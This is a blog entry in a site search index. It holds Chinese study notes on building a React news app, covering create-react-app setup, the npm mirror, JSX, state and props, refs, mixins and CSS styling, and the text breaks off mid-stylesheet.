<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[React实战项目news基础知识总结]]></title>
    <url>%2F2018%2F05%2F28%2FReact%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AEnews%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[React实战项目news基础知识学习总结部分。 React安装及开发环境配置(v16.2.0)使用npm包的形式下载及管理，不推荐使用cdn的形式直接引用和独立安装的形式。 项目初始化： 新建一个空文件夹，然后使用npm init初始化该项目，会生成一个package.json文件，之后的包管理会在该文件中配置。 create-react-app的安装 ： create-react-app 是一个全局的命令行工具用来创建一个新的项目。 （更新补充）： 如果使用了create-react-app命令来创建一个单页应用，就不需要npm init了，该命令已经自动化配置好了相关的开发环境，包括babel和webpack。 看了一些视频教程和博客，可能他们搭建环境时的react版本比较早，所以他们的npm包安装过程涉及react(react核心库)、react-dom(与DOM相关的功能)、babel(将 ES6 代码转为 ES5 代码,对 JSX 的支持)，我查看了下最新的官方文档，可以使用如下命令安装react及开启一个新应用，应该是最新版本的Create React App已经设置好了会一起下载包括babel等在内的开发环境需要的npm包，需要先全局安装create-react-app这个全局命令，如下： 1npm install -g create-react-app 然后利用create-react-app命令创建一个名为react_newsapp的react应用(注意：react应用的名字中不能包含大写字母)并启动，命令如下： create-react-app react_newsapp cd react_newsapp npm start 在使用create-react-app react_newsapp命令创建应用时，由以下安装提示可以发现，create-react-app会帮你自动下载所需要的多个react应用的基本依赖包,例如react,react-dom等。 阿西吧的事情又发生了。。。于是又卡在了下载资源这一步，由于create-react-app命令默认使用的npm源，真的是下载起来慢的无以表达，几度安装失败，挂了vpn也不行，最终放弃，换到 淘宝的镜像源 。由于create-react-app指令默认调用npm，于是直接把npm的register给永久设置过来就好了，这样使用cnpm或者npm就没差别了。参考博客create-react-app慢的解决方法，方法操作如下： npm config set registry https://registry.npm.taobao.org -- 配置后可通过下面方式来验证是否成功 npm config get registry -- 或npm info express 设置成功后，再执行create-react-app react_newsapp，安装成功后提示如下，使用了淘宝镜像源都下了一会儿，不然真要下到地老天荒。 安装成功后可以在项目的根目录下的package.json中查看引入的依赖，可以看到包括react、react-dom、react-scripts，如下： { &quot;name&quot;: &quot;react_newsapp&quot;, &quot;version&quot;: &quot;0.1.0&quot;, &quot;private&quot;: true, &quot;dependencies&quot;: { &quot;react&quot;: &quot;^16.3.1&quot;, &quot;react-dom&quot;: &quot;^16.3.1&quot;, &quot;react-scripts&quot;: &quot;1.1.4&quot; }, &quot;scripts&quot;: { &quot;start&quot;: &quot;react-scripts start&quot;, &quot;build&quot;: &quot;react-scripts build&quot;, &quot;test&quot;: &quot;react-scripts test --env=jsdom&quot;, &quot;eject&quot;: &quot;react-scripts eject&quot; } } 然后使用以下命令开启你创建的应用： cd react_newsapp npm start 参考博客(环境搭建) ：使用 create-react-app 构建 react应用程序 （react-scripts） ！！！注意 ： (1)教程是手动安装的react的依赖包，我查看了下，使用命令create-react-app react_newsapp后，在node_modules目录下，没有自动安装babelify依赖包，但有babel-preset-react，不知道到时候操作用不用得到，先记录下。手动安装babelify、babel-preset-react、babel-preset-es2015依赖包命令：npm install --save babelify babel-preset-react babel-preset-es2015 更正补充： 试了下安装babel-preset-es2015，但babel提示说最新的版本叫babel-preset-env，然后查看了下create-react-app自动安装的依赖包里已经有这个包了，所以不必再装老版本的babel-preset-es2015。（感叹。。。包包们变得如此之快。。。。） npm删除包 命令：npm uninstall &lt;package name&gt; (2)create-react-app使用像 Babel 和 webpack 这样的构建工具，但是已经为你配置好了，可以零配置使用。 React环境配置与调试技巧虽然 React 可以在没有构建管道的情况下使用，但是建议配置它，以便提高效率。一个现代构建管道通常包括： 一个 包管理器(package manager) ，如 Yarn 或 npm 。它可以让您利用大量的第三方软件包生态系统，并轻松安装或更新它们。 一个 打包工具(bundler) ，如webpack 或 Browserify。它允许您编写模块化代码并将他们在一起，成为一个小包，以实现加载性能的优化，节省加载时间。 一个 编译器(compiler) ，如Babel。 它可以让你在编写现代 JavaScript 代码的同时兼容旧版本浏览器. 手动安装webpack时全局安装：npm install -g webpack -&gt; npm install -g webpack-dev-server当前项目安装： npm install webpack --save -&gt; npm install webpack-dev-server --save create-react-app的目录结构使用create-react-app命令创建的项目目录结构默认如下所示： node_modules文件夹内是安装的所有依赖模块； package.json文件定义了项目的基本信息，如项目名称、版本号、在该项目下可执行的命令及项目的依赖模块等，如下： 1234567891011121314151617&#123; "name": "react_newsapp", "version": "0.1.0", "private": true, "dependencies": &#123; "react": "^16.3.1", "react-dom": "^16.3.1", "react-scripts": "1.1.4" &#125;, "scripts": &#123; "start": "react-scripts start", "build": "react-scripts build", "test": "react-scripts test --env=jsdom", "eject": "react-scripts eject" &#125;&#125; public文件夹下的index.html是应用的入口页面；src文件夹下是项目源代码，其中index.js是代码入口，可以在index.js中引入其他的模块(在这些模块中定义不同组建，将组件模块化)。public/index.html 是页面模板;src/index.js 是JavaScript的入口点，这两项不要修改名称或删除，其他的文件任意。（若要修改入口点，需要自己修改webpack的配置文件）注意： 把自己的js与css都放到src文件夹内，否则webpack无法打包；把index.html里用到的所有文件都放在Public文件夹下，否则无法使用。 脚手架自定义webpack配置(1) react默认配置文件都是隐藏的，如果要自定义，运行npm run eject，提示eject为不可恢复操作，输入y或者y开头的单词，即可进行eject。Create-React-App的Webpack配置(2) 点开package.json文件，可看到配置的命令是以 &quot;react-scripts *&quot; 来执行，所以打开node_modules文件夹，找到react-scripts文件夹进去， config目录即是你需要找的webpack的配置文件，然后就自己去修改配置就好。webpack.config有两个，一个是dev（开发）环境下的配置文件，一个为prod（生产环境下，即npm run build的配置文件）环境下的配置文件。paths为各种路径，我们可以在这个文件中添加我们自己的路径。需要修改的内容其实没多少，主要集中在entry入口跟output出口。 这里暂且不修改webpack的配置，就用create-react-app默认的脚手架，后面需要再修改(其实是看了看脚手架的配置文件太复杂了…)。接下来将src目录下的js文件们或者css文件们单独放到js目录或css目录下，整理一下不那么乱，然后再修改下对应文件的引入路径，让hello world跑起来。整理src目录结构如下： webpack热加载配置(1) Create React App 不会处理后端逻辑或数据库，它只是创建一个前端构建管道（build pipeline），所以可以使用它来配合任何想使用的后端。它使用 Babel 和 webpack 这样的构建工具，但是在使用create-react-app命令创建项目时已经配置好了，可以零配置使用，自带热加载效果。 (2)不使用脚手架时配置热加载。不使用create-react-app脚手架时，每次改动文件，都需要重新执行webpack命令才能重新打包文件，手动刷新浏览器体现改动效果。可以使用webpack --watch实现每次修改文件后不用手动执行webpack即可在刷新浏览器后看到改动效果，即webpack会自己打包编译改动过的文件。即使使用了webpack --watch命令可以自动打包编译改动过的文件，但还需要手动刷新浏览器才能看到效果，热加载配置就是在改动文件后，在浏览器中自动体现更改后的效果。 运行webpack-dev-server命令，然后将生成的app本地运行地址localhost:8080/webpack-dev-server贴到浏览器，即可实现自动刷新。如果还想去掉上面运行地址的尾巴webpack-dev-server，即使用类似localhost:8080地址即可观察应用的热加载。使用如下配置：1webpack-dev-server --contentbase src --inline --hot 其中contentbase src表示应用的默认运行目录。运行完上述命令，就会生成应用的本地运行地址localhost:8080。 React组件JSX内置表达式(1)三元表达式使用方式如下：1234567891011class Body extends Component &#123; render() &#123; var userName = 'Shirley'; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; (2)元素属性变量值的使用12345678910111213141516class Body extends Component &#123; render() &#123; var userName = 'Shirley'; var boolInput = true; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/p&gt; &lt;p&gt; &lt;input type="button" value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt; &lt;/p&gt; &lt;/div&gt; ); &#125;&#125; (3)jsx注释1234567891011121314151617class Body extends Component &#123; render() &#123; var userName = 'Shirley'; var boolInput = true; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/p&gt; &lt;p&gt; &lt;input type="button" value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt; &lt;/p&gt; &#123;/* 注释 */&#125; &lt;/div&gt; ); &#125;&#125; (4)jsx解析html将html中的空格字符使用unicode转码，jsx解析后会在页面显示空格。若html变量中使用&amp;nbsp;这样的html实体，jsx不会将其解析为空格，还是输出字符串。123456789101112131415161718class Body extends Component &#123; render() &#123; var userName = 'Shirley'; var boolInput = true; var htmlStr1 = 'Hello\u0020Stranger1'; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/p&gt; &lt;p&gt; &lt;input type="button" value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt; &lt;/p&gt; &#123;/* 注释 */&#125; &lt;p&gt;&#123;htmlStr1&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; 但该种方式还需要在后台设置unicode转码，比较麻烦。(注意：即使在htmlStr的Hello和Stranger之间添加多个\u0020，页面还是显示一个空格) 第二种方式是使用标签的dangerouslySetInnerHTML属性，但该属性可能造成XSS漏洞，也不建议使用，将要显示的html字符串挂载到__html这样一个变量上。123456789101112131415161718192021class Body extends Component &#123; render() &#123; var userName = 'Shirley'; var boolInput = true; var htmlStr1 = 'Hello\u0020Stranger1'; var htmlStr2 = 'Hello&amp;nbsp;Stranger2'; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/p&gt; &lt;p&gt; &lt;input type="button" value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt; &lt;/p&gt; &#123;/* 注释 */&#125; &lt;p&gt;&#123;htmlStr1&#125;&lt;/p&gt; &lt;p dangerouslySetInnerHTML= &#123;&#123;__html : htmlStr2&#125;&#125;&gt;&lt;/p&gt; &#123;htmlStr2&#125; &lt;/div&gt; ); &#125;&#125; 显示效果对比如下： 生命周期 src/components/body.js123456789class Body extends Component &#123; componentWillMount() &#123; console.log("Body-componentWillMount"); &#125; componentDidMount() &#123; console.log("Body-componentDidMount"); &#125;&#125; src/components/App.js12345678910111213141516171819202122232425import React, &#123; Component &#125; from 'react';import ComponentHeader from './header';import ComponentFooter from './footer';import Body from './body';class App extends Component &#123; componentWillMount() &#123; console.log("App-componentWillMount"); &#125; componentDidMount() &#123; console.log("App-componentDidMount"); &#125; render() &#123; return ( &lt;div className="App"&gt; &lt;ComponentHeader /&gt; &lt;Body /&gt; &lt;ComponentFooter /&gt; &lt;/div&gt; ); &#125;&#125;export default App; 不同组件的加载顺序如下： 状态statestate -&gt; 虚拟DOM -&gt; DOMstate是组件自身内部的属性，只会影响所在的组件，不会污染外部组件。12345678910111213141516171819class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; render() &#123; setTimeout(() =&gt; &#123; this.setState(&#123;userName: "Hello"&#125;); //2s后改变 state 的值 &#125;, 2000); return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; React中页面的刷新，只会作Diff有差异部分的刷新，比如一秒后对&lt;p&gt;标签内容的刷新，不会对整个页面进行刷新。初始化可以放在constructor构造函数里。调试技巧： Google控制台- &gt; console -&gt; show console drawer -&gt; Rendering -&gt; Paint flashing，会高亮当前改变的区域。 属性props（父组件-&gt;子组件）state和props会影响组件component，进一步影响UI。props是组件与外部沟通的桥梁，父组件通过props将自身的数据传递给子组件。而state是组件内部的属性，不会影响其他组件。123456789101112131415161718192021222324252627282930313233class App extends Component &#123; render() &#123; return ( &lt;div className="App"&gt; &lt;ComponentHeader /&gt; &lt;Body userId=&#123;123&#125; /&gt; &lt;ComponentFooter /&gt; &lt;/div&gt; ); &#125;&#125;class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; render() &#123; setTimeout(() =&gt; &#123; this.setState(&#123;userName: "Hello"&#125;); //2s后改变 state 的值 &#125;, 2000); return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; 子组件向父组件传递参数事件绑定如下：12345678910111213141516171819202122232425class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; changeUserInfo() &#123; this.setState(&#123;userName: "Your name has changed!"&#125;); &#125; render() &#123; // setTimeout(() =&gt; &#123; // this.setState(&#123;userName: "Hello"&#125;); //2s后改变 state 的值 // &#125;, 2000); return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &lt;input type="button" value="提交" onClick=&#123;this.changeUserInfo.bind(this)&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 其中onClick={this.changeUserInfo.bind(this)}是在调用时绑定this,可以使用ES6语法，如onClick={() =&gt; this.changeUserInfo()}。也可以直接在构造函数constructor里绑定this，this.changeUserInfo = this.changeUserInfo.bind(this);。 子组件向父组件传递数据： 只能通过事件的形式，从子组件向父组件传递数据。通过在父组件中事先定义好处理子组件事件的函数，并且以props属性的形式，将该事件处理函数传递给子组件，从而实现子组件向父组件传递数据。 例如在&lt;Body/&gt;组件中添加子组件&lt;BodyChild/&gt;，并且事先定义好了子组件在输入值改变时的事件处理函数handleChildValueChange(event)，以子组件属性的形式(&lt;BodyChild handleChildValueChange={this.handleChildValueChange.bind(this)}/&gt;)将该事件处理函数传递给子组件，从而实现从子组件&lt;BodyChild/&gt;向父组件&lt;Body/&gt;传递数据。 父组件&lt;Body/&gt;:123456789101112131415161718192021222324252627class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; changeUserInfo() &#123; this.setState(&#123;userName: "Your name has changed!"&#125;); &#125; handleChildValueChange(event) &#123; //通过事件形式，获取子组件的数据 this.setState(&#123;userName: event.target.value&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &lt;input type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /&gt; &#123;/* BodyChild 子组件 */&#125; &lt;BodyChild handleChildValueChange=&#123;this.handleChildValueChange.bind(this)&#125;/&gt; &lt;/div&gt; ); &#125;&#125; 子组件&lt;BodyChild/&gt;:123456789class BodyChild extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;p&gt;子页面输入:&lt;input type="text" onChange=&#123;this.props.handleChildValueChange&#125;/&gt;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; 这样当子组件文本输入框内的值改变时，会实时反映到父组件的&lt;p&gt;{this.state.userName}&lt;/p&gt;区域。 props属性校验props是一个组件对外暴露的接口，React提供了PropTypes对象，用于校验组件属性的类型。以Body组件为例，当类定义完之后，可以通过Body.propTypes形式，限定Body组件属性值的类型。如下：12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; Component &#125; from &apos;react&apos;;import PropTypes from &apos;prop-types&apos;;import BodyChild from &apos;./bodyChild&apos;;class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: &quot;Shirley&quot;&#125;; //初始化赋值 &#125; changeUserInfo() &#123; this.setState(&#123;userName: &quot;Your name has changed!&quot;&#125;); &#125; handleChildValueChange(event) &#123; //通过事件形式，获取子组件的数据 this.setState(&#123;userName: event.target.value&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &#123;/* 通过 PropTypes 对象校验uesrId的类型 */&#125; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &lt;input type=&quot;button&quot; value=&quot;提交&quot; onClick=&#123;() =&gt; this.changeUserInfo()&#125; /&gt; &#123;/* BodyChild 子组件 */&#125; &lt;BodyChild handleChildValueChange=&#123;this.handleChildValueChange.bind(this)&#125;/&gt; &lt;/div&gt; ); &#125;&#125;// Body组件props属性校验Body.propTypes = &#123; userId: PropTypes.number&#125;;export default Body; 当在Body父组件App中，通过props传递一个字符串给Body组件的userId属性，会报错：1234567891011121314151617181920import React, &#123; Component &#125; from 'react';import ComponentHeader from './header';import ComponentFooter from './footer';import Body from './body';class App extends Component &#123; render() &#123; return ( &lt;div className="App"&gt; &lt;ComponentHeader /&gt; &#123;/* Body组件通过 PropTypes对象校验uesrId的类型必须为Number类型 */&#125; &lt;Body userId=&#123;"hello"&#125; /&gt; &lt;ComponentFooter /&gt; &lt;/div&gt; ); &#125;&#125;export default App; 为组件属性指定默认值： 当组件属性未被赋值时，组件会使用defaultProps定义的默认属性。1234567Body.defaultProps = &#123; userId: 123&#125;;//或在组件头部定义const defaultProps = &#123; userId: 123&#125;; 传递当前组件的所有props参数的快捷方式： 利用...展开运算符。1&lt;Body &#123;...this.props&#125; more="values" /&gt; 组件的RefsRefs主要用来获取纯 HTML DOM节点，例如对&lt;input&gt;标签作focus处理，文本的选择等需要操作真实DOM的地方。绝大多数场景下，应该避免使用ref，因为它破坏了React中以props为数据传递介质的典型数据流。 第一种在React中操作真实DOM的方法如下，就像在原生js中操作DOM元素一样：1234567891011121314151617181920212223242526272829303132333435363738import React, &#123; Component &#125; from 'react';import PropTypes from 'prop-types';import ReactDOM from 'react-dom';import BodyChild from './bodyChild';class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; changeUserInfo() &#123; this.setState(&#123;userName: "Your name has changed!"&#125;); // 第一种方式操作DOM var submitBtn = document.getElementById("submitBtn"); ReactDOM.findDOMNode(submitBtn).style.color = 'red'; &#125; handleChildValueChange(event) &#123; //通过事件形式，获取子组件的数据 this.setState(&#123;userName: event.target.value&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &#123;/* 通过 PropTypes 对象校验uesrId的类型 */&#125; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &#123;/* 操作真实DOM */&#125; &lt;input id="submitBtn" type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /&gt; &#123;/* BodyChild 子组件 */&#125; &lt;BodyChild handleChildValueChange=&#123;this.handleChildValueChange.bind(this)&#125;/&gt; &lt;/div&gt; ); &#125;&#125; 第二种通过ref属性操作真实DOM，该方式更接近React的思维，推荐使用此方式进行必要的DOM操作：123456789101112131415161718192021222324252627282930313233343536373839404142import React, &#123; Component &#125; from 'react';import PropTypes from 'prop-types';// import ReactDOM from 'react-dom';import BodyChild from './bodyChild';class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; changeUserInfo() &#123; this.setState(&#123;userName: "Your name has changed!"&#125;); // 第一种方式操作真实DOM // var submitBtn = document.getElementById("submitBtn"); // ReactDOM.findDOMNode(submitBtn).style.color = 'red'; // 第二种方式操作真实DOM console.log(this.refs.submitBtn); this.refs.submitBtn.style.color = 'red'; &#125; handleChildValueChange(event) &#123; //通过事件形式，获取子组件的数据 this.setState(&#123;userName: event.target.value&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &#123;/* 通过 PropTypes 对象校验uesrId的类型 */&#125; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &#123;/* 操作真实DOM */&#125; &lt;input id="submitBtn" ref="submitBtn" type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /&gt; &#123;/* BodyChild 子组件 */&#125; &lt;BodyChild handleChildValueChange=&#123;this.handleChildValueChange.bind(this)&#125;/&gt; &lt;/div&gt; ); &#125;&#125; console.log(this.refs.submitBtn)结果：Refs特点：Refs是访问到组件内部DOM节点唯一可靠的方法。Refs会自动销毁对子组件的引用，即如果子组件被销毁，它的引用也会被销毁，从而不必担心内存问题。不要在render或render之前对ref进行引用，因为此时组件未渲染，组件内的DOM元素未加载，访问不到。只能为类组件定义ref属性，不能为函数组件定义ref属性。不要滥用Refs，尽量使用state和props维护UI。 独立组件间共享Mixin在ES6中使用mixin需要使用插件react-mixin。通过Mixins共享组件间的一些方法。例如新建一个src\components\mixins.js文件，里面定义组件间共享的一些方法，如下：1234567const MixinLog = &#123; log() &#123; console.log("You are using Mixin."); &#125;&#125;;export default MixinLog; 首先安装一下react-mixin: npm install --save react-mixin@2。在需要使用mixin共享方法的文件中，导入react-mixin安装包，以及引入共享方法所在的文件mixins.js：12import ReactMixin from 'react-mixin';import MixinLog from './mixins'; 然后将引入的共享文件导出对象赋值给组件的prototype对象，如下：12// 组件间共享 MixinReactMixin(Body.prototype, MixinLog); 接下来，就可以在需要使用共享方法的地方使用引入的共享对象中的方法：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import React, &#123; Component &#125; from 'react';import PropTypes from 'prop-types';// import ReactDOM from 'react-dom';import BodyChild from './bodyChild';import ReactMixin from 'react-mixin';import MixinLog from './mixins';class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; changeUserInfo() &#123; this.setState(&#123;userName: "Your name has changed!"&#125;); // 第一种方式操作真实DOM // var submitBtn = document.getElementById("submitBtn"); // ReactDOM.findDOMNode(submitBtn).style.color = 'red'; // 第二种方式操作真实DOM console.log(this.refs.submitBtn); this.refs.submitBtn.style.color = 'red'; // 使用Mixin共享方法log() MixinLog.log(); &#125; handleChildValueChange(event) &#123; //通过事件形式，获取子组件的数据 this.setState(&#123;userName: event.target.value&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &#123;/* 通过 PropTypes 对象校验uesrId的类型 */&#125; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &#123;/* 操作真实DOM */&#125; &lt;input id="submitBtn" ref="submitBtn" type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /&gt; &#123;/* BodyChild 子组件 */&#125; &lt;BodyChild handleChildValueChange=&#123;this.handleChildValueChange.bind(this)&#125;/&gt; &lt;/div&gt; ); &#125;&#125;// Body组件props属性校验Body.propTypes = &#123; userId: PropTypes.number&#125;;// 组件间共享 MixinReactMixin(Body.prototype, MixinLog);export default Body; 可以在mixin共享文件中使用生命周期函数，在生命周期函数中定义一些公用方法：12345678910const MixinLog = &#123; componentDidMount() &#123; console.log("Mixinlog componentDidMount"); &#125;, log() &#123; console.log("You are using Mixin."); &#125;&#125;;export default MixinLog; React样式以header.js为例，添加样式。(1)第一种方式可以在render()函数中，以json格式定义样式，然后将该样式以 内联 形式应用在返回的html标签的style属性上，如下：12345678910111213141516171819202122import React, &#123; Component &#125; from 'react';class ComponentHeader extends Component &#123; render() &#123; const styleComponentHeader = &#123; header: &#123; backgroundColor: "#333", color: "yellow", paddingTop: "15px", paddingBottom: "15px" &#125;, //还可以定义其他样式 &#125;; return ( &lt;header style=&#123;styleComponentHeader.header&#125;&gt; &lt;h1&gt;头部&lt;/h1&gt; &lt;/header&gt; ); &#125;&#125;export default ComponentHeader; 注意原生的CSS的样式名称在JSX中的写法，例如background-color在JSX中写为backgroundColor。(2)第二种方式，css 样式表 文件的引入。样式表的引入方式有两种，一种是在使用组件的HTML页面中通过link标签引入：1&lt;link rel="stylesheet" type="text/css" href="header.css"&gt; header.css123.smallFontSize h1 &#123; font-size: 10px;&#125; 另一种是把样式表文件当作一个模块，在使用该样式表的组件中，像使用其他组件一样import导入样式表文件。如下：1234567891011121314151617181920212223import React, &#123; Component &#125; from 'react';import '../css/header.css'; //导入样式表文件class ComponentHeader extends Component &#123; render() &#123; const styleComponentHeader = &#123; header: &#123; backgroundColor: "#333", color: "yellow", paddingTop: "15px", paddingBottom: "15px" &#125;, //还可以定义其他样式 &#125;; return ( &lt;header style=&#123;styleComponentHeader.header&#125; className="smallFontSize"&gt; &lt;h1&gt;头部&lt;/h1&gt; &lt;/header&gt; ); &#125;&#125;export default ComponentHeader; header.css1234.smallFontSize h1 &#123; font-size: 10px;&#125; 第一种引入样式表的方式常用于该样式表作用于整个应用的所有组件(一般是基础样式表)，第二种引入样式表的方式常用于该样式表作用于某个组件(相当于组件的私有样式)。全局的基础样式表也可以使用第二种方式引入，一般在应用的入口JS文件中引入，例如示例程序中的index.js。 内联样式中的表达式实现的效果：当点击header时，header高度变化。实现思路：通过点击改变state的值，来影响控制样式，在内联样式中可以使用表达式控制样式。1234567891011121314151617181920212223242526272829303132import React, &#123; Component &#125; from 'react';import '../css/header.css'; //导入样式表文件class ComponentHeader extends Component &#123; constructor() &#123; super(); this.state = &#123;miniHeader: false&#125;; //默认加载时header头部是高的 this.switchHeader = this.switchHeader.bind(this); &#125; switchHeader() &#123; this.setState(&#123;miniHeader: !this.state.miniHeader&#125;); //当点击header头部时，高度切换 &#125; render() &#123; const styleComponentHeader = &#123; header: &#123; backgroundColor: "#333", color: "yellow", paddingTop: (this.state.miniHeader) ? "3px" : "15px", //内联样式中的表达式 paddingBottom: (this.state.miniHeader) ? "3px" : "15px" &#125;, //还可以定义其他样式 &#125;; return ( &lt;header style=&#123;styleComponentHeader.header&#125; className="smallFontSize" onClick=&#123;this.switchHeader&#125;&gt; &lt;h1&gt;头部&lt;/h1&gt; &lt;/header&gt; ); &#125;&#125;export default ComponentHeader; CSS的模块化(样式表)CSS模块化解决的问题:全局污染、命名混乱、依赖管理不彻底、无法共享变量、代码压缩不彻底。以footer.js为例，添加CSS模块化样式。CSS模块化的优点：所有样式都是局部的，解决了命名冲突和全局污染问题；样式类名生成规则配置灵活，可以此来压缩类名；只需引用组件的JS就可搞定组件的所有JS和CSS。用到的三个有关的插件(create-react-app脚手架已经配置好了)：babel-plugin-react-html-attrs、style-loader、css-loader。footer.css1234567891011.miniFooter &#123; background-color: #333; color: #fff; padding-left: 20px; padding-top: 3px; padding-bottom: 3px;&#125;.miniFooter h1 &#123; font-size: 5px;&#125; 将CSS样式表导入并应用到footer.js：1234567891011121314import React, &#123; Component &#125; from 'react';var footerCss = require("../css/footer.css"); // 或直接使用 import '../css/footer.css'; 导入class ComponentFooter extends Component &#123; render() &#123; console.log(footerCss); return ( &lt;footer className="miniFooter"&gt; &lt;h1&gt;这里是页面底部&lt;/h1&gt; &lt;/footer&gt; ); &#125;&#125;export default ComponentFooter; 补充： 可以利用:local(.normal){color:green;}定义局部样式，导入CSS样式表默认就是添加局部样式；:global(.btn){color:red;}可以将样式应用到全局，即使用:global定义的样式，即使不使用import导入到组件，也可以在组件中直接使用，相当于全局的样式。footer.css现在如下设置：123:global(.miniFooter h1) &#123; font-size: 5px;&#125; 在header.js中并未通过import导入footer.css模块，但可以直接使用footer.css中的全局样式.miniFooter：1234567891011121314151617181920212223242526272829303132import React, &#123; Component &#125; from 'react';import '../css/header.css'; //导入样式表文件class ComponentHeader extends Component &#123; constructor() &#123; super(); this.state = &#123;miniHeader: false&#125;; //默认加载时header头部是高的 this.switchHeader = this.switchHeader.bind(this); &#125; switchHeader() &#123; this.setState(&#123;miniHeader: !this.state.miniHeader&#125;); //当点击header头部时，高度切换 &#125; render() &#123; const styleComponentHeader = &#123; header: &#123; backgroundColor: "#333", color: "yellow", paddingTop: (this.state.miniHeader) ? "3px" : "15px", //内联样式中的表达式 paddingBottom: (this.state.miniHeader) ? "3px" : "15px" &#125;, //还可以定义其他样式 &#125;; return ( &lt;header style=&#123;styleComponentHeader.header&#125; className="smallFontSize miniFooter" onClick=&#123;this.switchHeader&#125;&gt; &lt;h1&gt;头部&lt;/h1&gt; &lt;/header&gt; ); &#125;&#125;export default ComponentHeader; JSX样式与CSS的互转将CSS样式表中的样式转化为JSX中的样式在线的转化工具: translate plain CSS into the React in-line style specific JSON representation利用上述在线工具将CSS样式表中的样式转化为JSX中的JSON形式后，应用如下，以footer.js为例：123456789101112131415161718192021222324252627import React, &#123; Component &#125; from 'react';// var footerCss = require("../css/footer.css"); // 或直接使用 import '../css/footer.css'; 导入class ComponentFooter extends Component &#123; render() &#123; // console.log(footerCss); var footerConvertStyle = &#123; "miniFooter": &#123; "backgroundColor": "#333", "color": "#fff", "paddingLeft": "20px", "paddingTop": "3px", "paddingBottom": "3px" &#125;, "miniFooter_h1": &#123; "fontSize": "5px" &#125; &#125;; return ( &lt;footer style=&#123;footerConvertStyle.miniFooter&#125;&gt; &lt;h1 style=&#123;footerConvertStyle.miniFooter_h1&#125;&gt;这里是页面底部&lt;/h1&gt; &lt;/footer&gt; ); &#125;&#125;export default ComponentFooter; footer.css1234567891011.miniFooter &#123; background-color: 